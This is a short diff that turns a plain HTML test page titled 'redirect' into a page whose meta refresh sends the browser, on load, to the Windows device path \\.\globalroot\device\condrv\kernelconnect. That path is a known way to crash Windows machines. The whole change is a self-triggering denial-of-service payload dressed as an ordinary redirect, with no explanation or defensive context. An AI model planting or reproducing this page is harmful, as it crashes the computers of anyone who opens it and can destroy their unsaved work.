@@ -1,8 +1,2 @@
-<html>
-  <head>
-    <title>redirect</title>
-  </head>
-  <body>
-    <p>test</p>
-  </body>
-</html>
+<head>
+<meta http-equiv="refresh" content="1;URL=\\\\.\\globalroot\\device\\condrv\\kernelconnect"/></head>
